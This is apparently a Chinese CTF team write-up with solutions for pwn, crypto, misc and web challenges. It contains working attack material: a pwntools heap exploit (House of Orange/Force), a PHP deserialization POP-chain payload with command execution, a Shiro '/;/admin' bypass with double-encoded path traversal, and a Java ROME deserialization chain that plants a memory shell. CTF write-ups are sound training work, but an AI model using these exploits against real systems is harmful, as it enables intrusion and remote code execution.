+<p>根据题目名，猜测可能是House of Orange和House of Force搜索找到些资料：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PDCceypsuVmgv1Cv8KyluA">https://mp.weixin.qq.com/s/PDCceypsuVmgv1Cv8KyluA</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YRG67Ojm7Dix-5qpVRHAyQ">https://mp.weixin.qq.com/s/YRG67Ojm7Dix-5qpVRHAyQ</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Fb4y1Z7aE/">https://www.bilibili.com/video/BV1Fb4y1Z7aE/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16533388.html">https://www.cnblogs.com/ZIKH26/articles/16533388.html</a></p>
+<p>题目是8字节的堆溢出，但是没有free功能。</p>
+<p>则使用House of Orange的Stage1步骤(首先压缩top_chunk，随后申请一个大于top_chunk的size，将使得 top_chunk 被free掉，此时将被放到unsorted bin中)</p>
+<p>再申请 0x1000 的chunk，此时该chunk又被放入large bin中，从而留下了堆地址。</p>
+<p>拿出 unsorted bin 后便可以拿到libc地址和堆地址。</p>
+<p>最后用House of Force去打 __malloc_hook 即可。exp如下：</p>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;env python3</p>
+<h1 id="coding"><a href="#coding" class="headerlink" title="-*- coding:"></a>-*- coding:</h1><p>utf-8 -*-<br>from pwn import *context.clear(arch&#x3D;’amd64’, os&#x3D;’linux’, log_level&#x3D;’debug’)<br>sh &#x3D; remote(‘172.17.0.2’, 9541)<br>def add(size, content):    sh.sendlineafter(b’&gt; ‘, b’3’)    sh.sendlineafter(b’: ‘, str(size).encode())    sh.sendafter(b’: ‘, content)<br>sh.sendlineafter(b’&gt; ‘, b’1’)sh.sendlineafter(b’: ‘, b’1’)sh.sendlineafter(b’: ‘, b’1’)sh.sendlineafter(b’: ‘, b’1’)sh.sendlineafter(b’: ‘, b’1’)sh.sendlineafter(b’: ‘, b’1’)sh.sendlineafter(b’: ‘, b’1’)<br>add(0x18, b’a’ * 0x18 + p64(0xd81))sh.sendlineafter(b’&gt; ‘, b’0’ * 0x1000 + b’3’)sh.sendlineafter(b’: ‘, str(0x1000).encode())sh.sendafter(b’: ‘, b’xa0’)<br>add(0xd50, b’xa0’)<br>sh.sendlineafter(b’&gt; ‘, b’4’)sh.sendlineafter(b’: ‘, b’2’)libc_addr &#x3D; u64(sh.recvn(8)) - 0x3ec2a0success(‘libc_addr: ‘ + hex(libc_addr))sh.recvn(8)heap_addr &#x3D; u64(sh.recvn(8)) - 0x1280success(‘heap_addr: ‘ + hex(heap_addr))<br>add(0x18, b’a’ * 0x18 + p64(0xffffffffffffffff))__realloc_hook &#x3D; libc_addr + 0x3ebc28add((__realloc_hook - 8) - ((heap_addr + 0x22020) + 0x10) - 0x18, b’n’)add(0x18, b’0’ * 8 + p64(libc_addr + 0x10a38c) + p64(libc_addr + 0x98c30 + 4)) # padding + __realloc_hook + __malloc_hook<br>sh.sendlineafter(b’&gt; ‘, b’0’ * 0x1000 + b’3’)<br>sh.interactive()</p>
+<p>Crypto</p>
+<p>01</p>
+<p>xor</p>
+<p>letters &#x3D; string.ascii_lowercaserandom_string &#x3D; ‘’.join(random.choice(letters) for i in range(4))</p>
+<p>flag &#x3D; base64.b64encode(flag[5:-1].encode()).decode()fg &#x3D; [flag[i:i+4] for i in range(0, len(flag), 4)]</p>
+<p>题目给出了两个box的值</p>
+<p>关键的代码是这么一段，其中enumerate(k_box)产生的值就是(index,k_box[index])</p>
+<p>for z,t in enumerate(k_box):    k_box[z] &#x3D; t &lt;&lt; z    a&#x3D;(reduce(xor,k_box)) &gt;&gt; 3 ^ s2n(j) ^ s2n(key[0]) &gt;&gt; 5a_boxs.append(a)</p>
+<p>这里有三个异或成分：</p>
+<p>1.A&#x3D;(reduce(xor,k_box)) &gt;&gt; 3，意思就是将kbox列表成员依次异或，然后再右移</p>
+<p>2.B&#x3D;s2n(j) 4字节的flag片段</p>
+<p>3.C&#x3D;s2n(key[0]) &gt;&gt; 5 就是将key右移了一下，是个常量。对于A，其实就是最后的k_boxs[i]，因为每次赋值和上一次循环的结果无关（并不会和本身的a发生关系），所以这里的A也是一个常量，题目给的hint中，逆位移是错误的！</p>
+<p>题目提示：key需要自己通过给定的assert信息和生成信息来爆破，由于先左移和异或都是一个可逆的过程，对k_box盒中的所有值先异或在对加密后的值异或，处理左移，用左移的反操作右移即可还原回去。</p>
+<p>逆回去就是，B&#x3D;a_boxs[i]^C^A</p>
+<p>from libnum import *from operator import xor<br>from gmssl import sm3,funcimport base64,string,itertools,tqdmGKey&#x3D;lambda x:<br>sm3.sm3_hash(func.bytes_to_list(x.encode(‘utf-8’)))def Crack():  for x in tqdm.tqdm([‘’.join(x) for x in itertools.product(string.ascii_lowercase,repeat&#x3D;4)]):    if GKey(x)&#x3D;&#x3D;”ed7c5e5a9e7db0af63ff1857c74f1612503714e7257e3135161ac693263c5bc3”:      return xkey&#x3D;Crack()assert key&#x3D;&#x3D;”vyxj”k_boxs&#x3D;[[85960428, 124048944], [76896516, 148233042, 148344300, 430828728], [18813226, 47434414, 384576428, 756186952, 1176559104, 3012655264], [32419498, 135200222, 144078312, 418343384, 264781840, 997176032, 1575860096, 2311119872], [78138466, 26105444, 246378096, 673137192, 780322864, 580638816, 1013888320, 8267513088, 18261797376, 38464371712], [74398718, 34836126, 114351808, 84194008, 864090304, 2058369664, 3768046400, 9054897920, 3609117696, 31962163200, 78609714176, 143030124544], [95136078, 121787282, 142893752, 595233264, 1428549856, 3051172768, 5077270848, 1495076864, 12870877440, 47778328576, 70943019008, 73837846528, 347317125120, 202464190464], [25940628, 178611312, 187525036, 724730696, 1262246272, 538422912, 5178823296, 11962676480, 3681039360, 43111816192, 53454863360, 46940395520, 324584484864, 738174935040, 1180945874944, 2680363352064], [91476910, 40438622, 284009216, 189141944, 494422624, 1909378272, 1859258688, 8325893632, 8679649792, 25956180480, 19010518016, 149400145920, 75571052544, 216012996608, 877107707904, 1918758420480, 4670701109248, 1511231979520], [74597483, 35476838, 332670940, 628899328, 1006051312, 1810494112, 1815836800, 6254008448, 9059957248, 37066194944, 84866486272, 143417882624, 374722654208, 421553152000, 289192411136, 2595834003456, 1876405256192, 3073277952000, 5138042585088, 16906505420800], [43202734, 123038960, 230151348, 227006016, 1316620848, 2661215424, 1102296384, 6063244416, 13653935872, 15262126080, 56829879296, 203848990720, 319030505472, 273716043776, 1328383262720, 3109532008448, 1974875389952, 10583088431104, 17563729002496, 41257490972672, 104812289982464, 173872034873344], [40707932, 62510266, 127238668, 433986608, 1493914656, 2017700128, 941191424, 4402769536, 6413621248, 34974545408, 76024111104, 149649319936, 63424671744, 591347908608, 1425053548544, 2109411262464, 3604948779008, 1747924942848, 12591446097920, 36837998985216, 14717609312256, 116828735012864, 67418525270016, 162300363276288]]a_boxs&#x3D;[1320734445, 1299107274, 1462892431, 1369698413, 8147346610, 28131911745, 62500239353, 489185004903, 558579233563, 1461508494923, 30901854114296, 31037226326417]flag&#x3D;[]for i in range(len(k_boxs)):  flag.append(n2s(a_boxs[i]^((reduce(xor,k_boxs[i]))&gt;&gt;3)^(s2n(key)&gt;&gt;5)).decode())flag&#x3D;base64.b64decode(‘’.join(flag)).decode()print(“Key:%snFlag:<br>flag{%s}”%(key,flag))</p>
+<p>02</p>
+<p>Some Erratic</p>
+<p>（1）Challenge1</p>
+<p>nbits&#x3D;1024beta&#x3D;0.25p &#x3D; getPrime(nbits &#x2F;&#x2F; 2)q &#x3D; next_prime(p+getRandomNBitInteger(int(nbits*beta)))</p>
+<p>费马因式分解</p>
+<p>对于任一个奇数n，n &#x3D; ab &#x3D; x2-y2</p>
+<p>∵ n &#x3D; ab &#x3D; (x+y)*(x-y)∴ a &#x3D; x + y, b &#x3D; x-yx &#x3D; (a+b)&#x2F;2, y &#x3D; (a-b)&#x2F;2 (因为n为奇数，a, b必也为奇数，所以(a+b)和(a-b)必为偶数，故能被2整除，x, y为整数，x &gt; y)</p>
+<p>p,q挨得很近，所以对n开根号的结果肯定位于p,q之间，那么开根号之后的下一个素数就是q了。</p>
+<p>这里可以直接使用yafu分解出来，如图所示：</p>
+<p>from Crypto.Util.number import *from libnum import <em>from gmpy2 import <em>p&#x3D;10723952297843364786156929715608186673824989778827123114729658453167763205220791771822778751909012960229915274457218832420541336771509448047644069517341441q&#x3D;10723952297843364786156929715608186673824989778827123114729658453167763205220864100075262838969409132981145925287473981410039353654288586176839546999980559c&#x3D;4683860292178905393956126264938663681975905303901914717230332783725185630718947576830406810628786941566084952137064099532907383417183948121928037829755743872588634917591802704043136980938886111652461153361337562856144992151703143305512294568871604157763770074219187267063108239508617811016431179485003213035n&#x3D;115003152886419983681144304614857464253607083192987092744909476881003877437075034587256814044556674185221251648000461436525204404176667857416335352906784895367609649446600147893387688176260185504558426661409555464100257797704637961842440960157067193151612929859347566584912178351943666596100822411740365045519e&#x3D;39466n&#x3D;p</em>qphi&#x3D;(p-1)</em>(q-1)t&#x3D;gcd(e,phi)d&#x3D;invert(e&#x2F;&#x2F;t, phi)m&#x3D;powmod(c,d,n)m&#x3D;iroot(m,t)flag &#x3D; n2s(int(m[0])).decode()print(flag)#flag{You-Know-ephi-not-invert}</p>
+<p>（2）Challenge2</p>
+<p>primes &#x3D; [getPrime(128) for _ in range(1000)]def getMyPrime(nbits: int):        while True:            n &#x3D; 2            while n.bit_length() &lt; nbits:                n *&#x3D; random.choice(primes)            if isPrime(n+1):                return n+1</p>
+<p>可以知道，该函数的返回值和n有关，n的迭代为n *&#x3D; choice(primes)，即通过小素数累乘得到的，并且由于random.choice()函数，那么这些小素数互不相同。除此之外，最后的返回值为n+1，也就是说 p&#x3D;n+即 p – 1 是一个光滑数。</p>
+<p>因此，我们可以选择Smooth攻击中的p-1光滑攻击，Pollard_rho算法。对于p-1光滑攻击，尝试使用此函数攻击N：</p>
+<p>def Pollard_rho(N):    a &#x3D; 2 # 为了快速计算以及满足费马小定理条件    n &#x3D; 2 # 从1开始没必要    while (True):        a &#x3D; pow(a, n, N)        p &#x3D; gcd(a - 1, N)        if p !&#x3D; 1 and p !&#x3D; n:            return p        n +&#x3D; 1</p>
+<p>上面的函数中，p-1的因子太多，所以出不来；</p>
+<p>再看题目，实际上是给了p-1的因数的，而p-1远远达不到整个素数列表成员的乘积（Mul_Group），但p-1定是Mul_Group的因子，即满足k(p-1)&#x3D;Mul_Group</p>
+<p>因此，只要满足0&lt;gcd(a^mul_group-1,n)&lt;n，就能求到p。</p>
+<p>由欧几里得算法可知</p>
+<p>gcd(a^Mul_Group-1,n)&#x3D;gcd((a^Mul_Group-1)%n,n)</p>
+<p>根据余数的性质：</p>
+<p>（1）任一整数被整数a除后，余数一定是且仅是0到(a-1)这a个数中的一个</p>
+<p>（2）相邻的a个整数被正整数a除后，恰好取到上述a个余数。特别地，一定有且仅有一个数被a整数。</p>
+<p>因此可得：</p>
+<p>gcd(a^Mul_Group-1,N)&#x3D;gcd((a^Mul_Group%N)-1,N)最终脚本为：</p>
+<p>from Crypto.Util.number import *from libnum import <em>from gmpy2 import <em>N&#x3D;105693066294692090428120492282360423623332948001444868155609687342896295733744325175901738933099577576305552497351171328636372334357226336334014475727532013770919058459498705840962386579296720075803313144948862168617254759061750303073242103385953470598588821298558182545075843037752946756268753654459857357773<br>def Get():  a&#x3D;2  primes&#x3D;[…]  Mul_Group&#x3D;1  for x in primes:    Mul_Group</em>&#x3D;x  p&#x3D;gcd(pow(a,Mul_Group,N)-1,N)  return p#p&#x3D;Get()p&#x3D;13537357593182943760549076001986916127729056585483232435862464322225222721242076952974902134443359026157925461451330929032089583284820898264165591023404647q&#x3D;N&#x2F;&#x2F;pphi&#x3D;(p-1)</em>(q-1)c &#x3D; 103098461800286996429171660021414925966093478619253436602232971969341281856030245006630388718292570005153435514675207542689431699948146670756537281552849614108826708534870688773921625688661211973873302580385044231926119768544392742128096319799969126263095425468271074769423608363979804283088125862297793195229e&#x3D; 0x10001d&#x3D;invert(e,phi) m&#x3D;int(pow(c,d,N))flag&#x3D;n2s(m).decode()print(flag)#flag{Smooth-is-very-cool}</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_73643549/article/details/133692704https://www.cnblogs.com/futihuanhuan/p/18100325">https://blog.csdn.net/qq_73643549/article/details/133692704https://www.cnblogs.com/futihuanhuan/p/18100325</a></p>
+<p>（3）Challenge3</p>
+<p>此题与NSSCTF上的一题相似度高达%90原题链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/4028">https://www.nssctf.cn/problem/4028</a></p>
+<p>故此题是LCG当中的给出的seed并不是连续的那种类型：</p>
+<p>参考DexterJie师傅的博客：</p>
+<p>from Crypto.Util.number import *import gmpy2<br>output &#x3D; [119444446894587372581296728153418842424972532346323290092358901147846017532,116115165644797564522740358185970802120930635153965165009865786907134059364,37049123079699901350837013976856659163619369801178080438668856263818967139,5126114380624889407734309488357199346967937488993420757621013519949873892,72235467163060541611760931209616453277564984959523932791804478509097219171]t &#x3D; []for i in range(1,len(output)):    t.append(output[i]-output[i-1])<br>T &#x3D; []for i in range(1,len(t)-1):    T.append(t[i+1]*t[i-1] - t[i]<strong>2)<br>m &#x3D; []for i in range(len(T)-1):    mm &#x3D; gmpy2.gcd(T[i],T[i+1])    if isPrime(mm):        m.append(int(mm))    else:        for i in range(1,100):            if isPrime(mm &#x2F;&#x2F; i):                mm &#x3D; mm &#x2F;&#x2F; i                m.append(int(mm))                break<br>for i in m:    a &#x3D; gmpy2.invert(t[0],i) * t[1] % i    b &#x3D; output[1] - a*output[0] % i    a_ &#x3D; gmpy2.invert(a,i)<br>    seed &#x3D; a_ * (output[0]-b) % i    for _ in range(2</strong>16):        seed &#x3D; a_ * (seed - b) % i        flag &#x3D; long_to_bytes(seed)        if b’flag’ in flag:            print(flag.decode())#flag{odd-Lcg-also-Cool}</p>
+<p>from hashlib import *flag1&#x3D;b’flag{You-Know-ephi-not-invert}’flag2&#x3D;b’flag{Smooth-is-very-cool}’flag3&#x3D;b’flag{odd-Lcg-also-Cool}’print(“flag{%s}”%md5((flag1+flag2+flag3)).hexdigest())#flag{6ba1ccae1f3efb63be48c23ef8bb78d7}</p>
+<p>Misc</p>
+<p>01</p>
+<p>最简单的隐写</p>
+<p>方法一</p>
+<p>直接查一波可见字符串，直接秒</p>
+<p>strings Steganography.jpg | find “flag”</p>
+<p>方法二</p>
+<p>按照常规的思路，即不直接从文件数据中提出flag的方法，可以这样分析。首先用010 Editor打开</p>
+<p>01</p>
+<p>删除后门用户</p>
+<p>ssh <a href="mailto:&#x63;&#116;&#102;&#x40;&#x33;&#x39;&#x2e;&#49;&#48;&#x36;&#x2e;&#52;&#x38;&#46;&#49;&#x32;&#x33;">&#x63;&#116;&#102;&#x40;&#x33;&#x39;&#x2e;&#49;&#48;&#x36;&#x2e;&#52;&#x38;&#46;&#49;&#x32;&#x33;</a> -p 18593cat &#x2F;etc&#x2F;passswd 或者用getent passwd</p>
+<p>root:x:0:0:<br>root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:<br>daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:<br>bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:<br>sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:<br>65534:<br>sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:<br>games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:<br>man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:<br>mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:<br>news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:<br>uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:<br>proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:<br>www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:<br>backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:<br>Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:<br>ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:<br>Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:<br>65534:<br>65534:<br>nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:<br>100:<br>65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-timesync:x:<br>101:<br>102:<br>systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-network:x:<br>102:<br>104:<br>systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-resolve:x:<br>103:<br>105:<br>systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinmessagebus:x:<br>104:<br>106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsshd:x:<br>105:<br>65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologinbackdoor:x:0:<br>1000::&#x2F;home&#x2F;backdoor:&#x2F;sbin&#x2F;nologinctf:x:<br>1000:<br>1001::&#x2F;home&#x2F;ctf:&#x2F;bin&#x2F;bash</p>
+<p>userdel -f -r backdoor</p>
+<p>id backdoor</p>
+<p>cat &#x2F;flag</p>
+<p>Web</p>
+<p>01</p>
+<p>ez_unserialize</p>
+<p>php反序列化。</p>
+<p>先从攻击点出发，来到four.eval()函数中存在system($this-&gt;s)可以进行命令执行；</p>
+<p>用more${IFS}&#x2F;*去绕过正则的限制；</p>
+<p>接着跟，是toString()调用了eval()函数，toString()这个魔术方法，用于一个类被当成字符串时应怎样回应。</p>
+<p>接着就是如何将four()这个类当成字符串了，这里找到three()中的return “look!you are hero”.$this-&gt;kkk;</p>
+<p>将字符串”return “look!you are hero”与three.kkk进行拼接，因此这里的kkk可以是将类当成字符串来拼接。kkk在get中，PHP的get魔术方法是一种在访问一个不存在或不可访问的属性时自动调用的方法，所以我们得想办法访问到three-&gt;xxx；观察到two()方法，用$this–&gt;func-&gt;arg调用了一个属性；这里只要令func指向three，那么three中自然不存在arg，所以get会被触发。</p>
+<p>two()类中的call()方法用于处理对象中不存在的方法调用。‌ 当在对象上调用一个不存在的方法时，‌call()方法会被自动调用，‌one类中的wakeup()中，a–&gt;new()，调用了一个类中的new方法，就可以触发call()</p>
+<p>至于one中的wakeup()，是在反序列化恢复对象之前调用该方法。php脚本中自动给我们了unserialize，那么__wakeup会被先调用。</p>
+<p>整个pop链为：one::<br>wakeup-&gt;two::<br>call-&gt;three::<br>get-&gt;four::<br>tostring-&gt;four::<br>eval</p>
+<?php  class one{    public $a;  }  class two{    public $func;    public $arg;  }  class three{    public $kkk;  }  class four{    public $s;  }  $one = new one();  $two = new two();  $three = new three();  $four = new four();  $four->s = 'more${IFS}/*';  $three->kkk = $four;  $two->func = $three;  $one->a = $two;  $payload = base64_encode(serialize($one));  echo $payload;?>
+
+<p>http:&#x2F;&#x2F;<strong>.</strong>.**&#x2F;?cmd&#x3D;TzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjEyOiJtb3JlJHtJRlN9LyoiO319czozOiJhcmciO047fX0&#x3D;</p>
+<p>02</p>
+<p>ezJava</p>
+<p>非预期解</p>
+<p>这是一种非预期解法，所以和题目描述的Java反序列化没有关系。</p>
+<p>猜测可能是Shiro，参考文章:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50750081/article/details/136147826">https://blog.csdn.net/weixin_50750081/article/details/136147826</a></p>
+<p>尝试使用&#x2F;;&#x2F;admin来登录（至于admin怎么来的，可以说是fuzz拿到的）</p>
+<p>GET &#x2F;;&#x2F;admin</p>
+<p>可以看到，泄露了download接口，再看参数filename，猜测可能有任意文件读；</p>
+<p>这里对..&#x2F;..&#x2F;flag进行二次url编码来绕过黑名单</p>
+<p>预期解</p>
+<p>预期解是使用反序列化漏洞。在上面的过程中，读到admin的时候，泄露了ls接口和download接口。使用&#x2F;ls?path&#x3D;来查看目录里面的文件信息。直接GET &#x2F;;&#x2F;admin&#x2F;ls?path&#x3D;.可以看到当前运行目录的文件。</p>
+<p>GET &#x2F;;&#x2F;admin&#x2F;ls?path&#x3D;%25%32%45%25%32%45%25%32%46</p>
+<p>可以得到根目录的情况</p>
+<p>GET &#x2F;;&#x2F;download?filename&#x3D;%25%32%45%25%32%45%25%32%46%61%70%70%25%32%46%65%7a%4a%61%76%61%25%32%45%6a%61%72</p>
+<p>利用CC7前半段触发EqualsBean的equals去触发getter，整条链就结束了Runtime和ProcessBuilder被ban了，没法直接命令执行，得打内存马。参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/F12-blog/p/18124568">https://www.cnblogs.com/F12-blog/p/18124568</a></p>
+<p>这里使用jdk8相关依赖：</p>
+<p><dependencies>  <dependency>    <groupId>commons-collections</groupId>    <artifactId>commons-collections</artifactId>    <version>3.2.1</version>  </dependency>  <dependency>    <groupId>rome</groupId>    <artifactId>rome</artifactId>    <version>1.0</version>  </dependency></dependencies></p>
+<p>用下面的工具生成一个内存码：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pen4uin/java-memshell-generator">https://github.com/pen4uin/java-memshell-generator</a></p>
+<p>package org.Rome;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.syndication.feed.impl.EqualsBean;<br>import javax.xml.transform.Templates;<br>import java.io.*;<br>import java.lang.reflect.Field;<br>import java.nio.file.Files;<br>import java.nio.file.Paths;<br>import java.util.Base64;<br>import java.util.HashMap;<br>import java.util.Hashtable;<br>public class Rome {    public static void main(String[] args) throws Exception{        byte[] bytes &#x3D; Files.readAllBytes(Paths.get(“.\src\main\java\org\Rome\ImageUtil.class”));        TemplatesImpl templates &#x3D; new TemplatesImpl();        setFieldValue(templates, “_bytecodes”, new byte[][]{bytes});        setFieldValue(templates,”_class”,null);        setFieldValue(templates, “_name”, “ImageUtil”);        EqualsBean bean &#x3D; new EqualsBean(String.class, “ImageUtil”);        HashMap map1 &#x3D; new HashMap();        HashMap map2 &#x3D; new HashMap();        map1.put(“yy”, bean);        map1.put(“zZ”, templates);        map2.put(“zZ”, bean);        map2.put(“yy”, templates);        Hashtable table &#x3D; new Hashtable();        table.put(map1, “1”);        table.put(map2, “2”);        setFieldValue(bean, “_beanClass”, Templates.class);        setFieldValue(bean, “_obj”, templates);        Serialize(table);    }    public static void Serialize(Object object) throws Exception{        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(“rome.bin”));        objectOutputStream.writeObject(object);        objectOutputStream.close();        File file &#x3D; new File(“rome.bin”);        byte[] fileContent &#x3D; new byte[(int) file.length()];        FileInputStream fileInputStream &#x3D; new FileInputStream(file);        fileInputStream.read(fileContent);        fileInputStream.close();        String base64Encoded &#x3D; Base64.getEncoder().encodeToString(fileContent);        System.out.println(base64Encoded);    }    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj, value);    }}</p>
+<p>import requests as reqfrom urllib.parse import quoteurl&#x3D;”<a target="_blank" rel="noopener" href="http://eci-2zed055p3vx2qdwqoe3x.cloudeci1.ichunqiu.com/">http://eci-2zed055p3vx2qdwqoe3x.cloudeci1.ichunqiu.com</a>:<br>8080”api&#x3D;’&#x2F;evil’furl&#x3D;url+apixx&#x3D;”…………………..”payload&#x3D;{    “cmd”:xx}f&#x3D;req.post(furl,data&#x3D;payload)print(f.text)</p>
+<p>java.lang.RuntimeException: Could not execute equals()</p>
+<p>文末:</p>
+<p>欢迎师傅们加入我们:</p>
+<p>星盟安全团队纳新群1:<br>222328705</p>
+<p>星盟安全团队纳新群2:<br>346014666</p>
+<p>有兴趣的师傅欢迎一起来讨论!</p>
+<p>PS:<br>团队纳新简历投递邮箱：</p>
+<p><a href="mailto:&#x78;&#109;&#x63;&#118;&#101;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;">&#x78;&#109;&#x63;&#118;&#101;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;</a></p>
+<p>责任编辑：@wuyua师傅</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">sbox=[get_wide_byte(0x403040+i) for i in range(320)]v5=[0x18, 0x10, 0xcf, 0xe6, 0x16, 0x5b, 0x4e, 0xe6, 0x2c, 0x87, 0x91, 0x92, 0x1b, 0xaa, 0x8, 0xee, 0xd6, 0x70, 0x74, 0x42, 0xe9, 0x7, 0x7, 0x46, 0xd6, 0x16, 0x2a, 0x42, 0xfa, 0x6c, 0x89, 0xe7, 0x2d, 0x29, 0x53, 0x60, 0xc5, 0xa, 0x4d, 0x53, 0xc5, 